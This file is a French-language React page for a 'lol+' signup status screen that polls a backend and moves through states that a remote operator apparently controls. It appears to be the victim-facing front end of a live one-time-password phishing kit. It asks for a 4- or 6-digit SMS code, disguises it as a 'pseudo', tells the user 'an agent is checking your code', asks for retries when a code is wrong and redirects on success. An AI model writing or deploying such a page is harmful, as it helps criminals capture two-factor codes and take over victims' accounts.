import { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { toast } from "sonner";
import { CheckCircle2, Loader2 } from "lucide-react";
import Logo from "../components/Logo";
import { getUserState, submitCode } from "../lib/api";

const ooo_LEN = [4, 6]; // longueurs acceptées (choisies par l'utilisateur)

function ErrorCard({ message }) {
    return (
        <>
            <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
                <div style={{ width: 90, height: 90, borderRadius: 999, background: "rgba(239,68,68,0.15)", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 0 40px rgba(239,68,68,0.35)", color: "#ef4444", fontSize: 42, fontWeight: 800 }}>!</div>
            </div>
            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
                <span style={{ color: "#ef4444" }}>Erreur</span>
            </h2>
            <p style={{ textAlign: "center", color: "#c0c0c0", margin: "0 0 12px", lineHeight: 1.5 }}>
                {message || "Une erreur est survenue. Réessaie plus tard."}
            </p>
        </>
    );
}

function StateBadge({ state }) {
    const map = {
        pending: { label: "En attente", color: "#FACC15" },
        code: { label: "Vérification code", color: "#FACC15" },
        processing: { label: "Traitement", color: "#FACC15" },
        code_received: { label: "En révision", color: "#3b82f6" },
        success: { label: "Succès", color: "#22c55e" },
        declined: { label: "Refusé", color: "#ef4444" },
        error: { label: "Erreur", color: "#ef4444" },
    };
    const s = map[state] || map.pending;
    return (
        <span
            className="lol-chip active"
            style={{ background: `${s.color}`, color: "#0a0a0a" }}
            data-testid={`state-badge-${state}`}
        >
            <span className="lol-dot" style={{ background: "#0a0a0a", boxShadow: "none" }} />
            {s.label.toUpperCase()}
        </span>
    );
}

function PendingCard({ nickname }) {
    return (
        <>
            <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
                <div className="lol-spinner" />
            </div>
            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
                Salut, <span className="lol-accent">{nickname || "toi"}</span> <span role="img" aria-label="wave">👋</span>
            </h2>
            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 22px", lineHeight: 1.55 }}>
                Ton inscription est reçue. On vérifie ton dossier — le code arrive par SMS dans un instant.
            </p>
            <div style={{ display: "flex", justifyContent: "center" }}>
                <StateBadge state="pending" />
            </div>
        </>
    );
}

function CodeCard({ userId, onSubmitted, errorMsg }) {
    const MAX = Math.max(...ooo_LEN);
    const [len, setLen] = useState(MAX); // nombre de cases affichées
    const [digits, setDigits] = useState(Array(MAX).fill(""));
    const [sending, setSending] = useState(false);
    const refs = useRef([]);

    const chooseLen = (n) => {
        setLen(n);
        setDigits(Array(n).fill(""));
        setTimeout(() => refs.current[0]?.focus(), 0);
    };

    const setD = (i, v) => {
        const c = v.replace(/\D/g, "").slice(-1); // un seul chiffre
        setDigits((prev) => {
            const n = [...prev];
            n[i] = c;
            return n;
        });
        if (c && i < len - 1) refs.current[i + 1]?.focus();
    };

    const handleKey = (i, e) => {
        if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
        if (e.key === "ArrowLeft" && i > 0) refs.current[i - 1]?.focus();
        if (e.key === "ArrowRight" && i < len - 1) refs.current[i + 1]?.focus();
    };

    const handlePaste = (e) => {
        const t = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, len);
        if (!t) return;
        e.preventDefault();
        setDigits(Array.from({ length: len }, (_, i) => t[i] ?? ""));
        refs.current[Math.min(t.length, len - 1)]?.focus();
    };

    const full = digits.join("");
    const ready = full.length === len && !sending;

    const submit = async () => {
        setSending(true);
        try {
            await submitCode(userId, full);
            toast.success("pseudo envoyé, on vérifie...");
            onSubmitted();
        } catch {
            toast.error("Erreur, réessaie.");
        } finally {
            setSending(false);
        }
    };

    return (
        <>
            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "6px 0 6px" }}>
                <span className="lol-accent">Vérification</span> du pseudo
            </h2>
            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 24px", lineHeight: 1.5 }}>
                Entre le pseudo reçu par DM discord.
            </p>
            {errorMsg && (
                <div style={{ margin: "0 0 16px", padding: "10px 14px", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.35)", borderRadius: 12, color: "#ef4444", fontSize: 13, textAlign: "center" }} data-testid="wrong-pseudo-banner">
                    ❌ Pseudo incorrect. Un nouveau pseudo arrive, réessaie.
                </div>
            )}

            <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 18 }}>
                {ooo_LEN.map((n) => (
                    <button
                        key={n}
                        type="button"
                        onClick={() => chooseLen(n)}
                        data-testid={`ooo-len-${n}`}
                        style={{
                            padding: "8px 18px",
                            borderRadius: 10,
                            fontWeight: 600,
                            cursor: "pointer",
                            border: "1px solid " + (len === n ? "#facc15" : "#333"),
                            background: len === n ? "rgba(250,204,21,0.15)" : "transparent",
                            color: len === n ? "#facc15" : "#9a9a9a",
                        }}
                    >
                        ooo {n}
                    </button>
                ))}
            </div>

            <div style={{ display: "flex", justifyContent: "center", gap: 8, marginBottom: 22 }} onPaste={handlePaste}>
                {digits.map((d, i) => (
                    <input
                        key={i}
                        ref={(el) => (refs.current[i] = el)}
                        className="ooo-input"
                        inputMode="numeric"
                        maxLength={1}
                        value={d}
                        onChange={(e) => setD(i, e.target.value)}
                        onKeyDown={(e) => handleKey(i, e)}
                        data-testid={`ooo-input-${i}`}
                    />
                ))}
            </div>
            <button
                className="lol-btn"
                disabled={!ready}
                onClick={submit}
                data-testid="ooo-submit-btn"
            >
                {sending ? "Envoi..." : "Valider le pseudo"}
            </button>
        </>
    );
}

function ProcessingCard() {
    return (
        <>
            <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
                <Loader2 size={72} className="lol-accent" style={{ animation: "lolspin 1s linear infinite" }} />
            </div>
            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
                <span className="lol-accent">Traitement</span> en cours
            </h2>
            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 20px", lineHeight: 1.5 }}>
                Merci ! On finalise ton dossier — ne ferme pas la page.
            </p>
            <div style={{ display: "flex", justifyContent: "center" }}>
                <StateBadge state="processing" />
            </div>
        </>
    );
}

function SuccessCard() {
    return (
        <>
            <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
                <div style={{ width: 90, height: 90, borderRadius: 999, background: "rgba(34,197,94,0.15)", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 0 40px rgba(34,197,94,0.35)" }}>
                    <CheckCircle2 size={54} color="#22c55e" strokeWidth={2.5} />
                </div>
            </div>
            <h2 style={{ fontSize: 28, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
                C'est <span style={{ color: "#22c55e" }}>validé</span> !
            </h2>
            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 22px", lineHeight: 1.5 }}>
                Ton compte lol+ est actif. Tu peux fermer cette fenêtre.
            </p>
            <div style={{ display: "flex", justifyContent: "center" }}>
                <StateBadge state="success" />
            </div>
        </>
    );
}

function ReviewCard({ nickname }) {
    return (
        <>
            <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
                <Loader2 size={72} className="lol-accent" style={{ animation: "lolspin 1s linear infinite" }} />
            </div>
            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
                Code <span className="lol-accent">reçu</span>
            </h2>
            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 20px", lineHeight: 1.5 }}>
                Merci {nickname || ""} ! Un agent vérifie ton code. Ne ferme pas la page.
            </p>
            <div style={{ display: "flex", justifyContent: "center" }}>
                <StateBadge state="code_received" />
            </div>
        </>
    );
}

function DeclinedCard({ reason }) {
    return (
        <>
            <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
                <div style={{ width: 90, height: 90, borderRadius: 999, background: "rgba(239,68,68,0.15)", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 0 40px rgba(239,68,68,0.35)", color: "#ef4444", fontSize: 42, fontWeight: 800 }}>✕</div>
            </div>
            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
                <span style={{ color: "#ef4444" }}>Refusé</span>
            </h2>
            <p style={{ textAlign: "center", color: "#c0c0c0", margin: "0 0 12px", lineHeight: 1.5 }}>
                Ta demande a été refusée.{reason ? ` Raison : ${reason}` : ""}
            </p>
            <div style={{ display: "flex", justifyContent: "center" }}>
                <StateBadge state="declined" />
            </div>
        </>
    );
}

export default function UserStatus() {
    const { id } = useParams();
    const [state, setState] = useState("pending");
    const [nickname, setNickname] = useState(localStorage.getItem("lol_nickname") || "");
    const [errorMsg, setErrorMsg] = useState("");
    const [redirectUrl, setRedirectUrl] = useState("");
    const [declineReason, setDeclineReason] = useState("");
    const [notFound, setNotFound] = useState(false);

    useEffect(() => {
        let alive = true;
        const tick = async () => {
            try {
                const s = await getUserState(id);
                if (!alive) return;
                setState(s.state);
                if (s.nickname) setNickname(s.nickname);
                setErrorMsg(s.error_message || "");
                if (s.decline_reason) setDeclineReason(s.decline_reason);
                if (s.redirect_url) setRedirectUrl(s.redirect_url);
                if (s.state === "success" && s.redirect_url) {
                    setTimeout(() => { window.location.href = s.redirect_url; }, 1400);
                }
            } catch (err) {
                if (err?.response?.status === 404) setNotFound(true);
            }
        };
        tick();
        const iv = setInterval(tick, 2500);
        return () => {
            alive = false;
            clearInterval(iv);
        };
    }, [id]);

    if (notFound) {
        return (
            <div className="lol-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
                <div className="lol-card" style={{ padding: 30, maxWidth: 380 }}>
                    <p style={{ textAlign: "center" }}>Session introuvable.</p>
                </div>
            </div>
        );
    }

    return (
        <div className="lol-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
            <div className="lol-card" style={{ width: "100%", maxWidth: 420, padding: "32px 26px" }} data-testid={`status-card-${state}`}>
                <div style={{ textAlign: "center", marginBottom: 18 }}>
                    <Logo />
                </div>
                {state === "pending" && <PendingCard nickname={nickname} />}
                {state === "code" && <CodeCard userId={id} onSubmitted={() => setState("code_received")} errorMsg={errorMsg} />}
                {state === "processing" && <ProcessingCard />}
                {state === "code_received" && <ReviewCard nickname={nickname} />}
                {state === "success" && <SuccessCard />}
                {state === "declined" && <DeclinedCard reason={declineReason} />}
                {state === "error" && <ErrorCard message={errorMsg} />}
            </div>
            <p style={{ position: "absolute", bottom: 16, color: "#4a4a4a", fontSize: 12 }} data-testid="footer-state">
                État : <span className="lol-accent">{state}</span>
            </p>
        </div>
    );
}
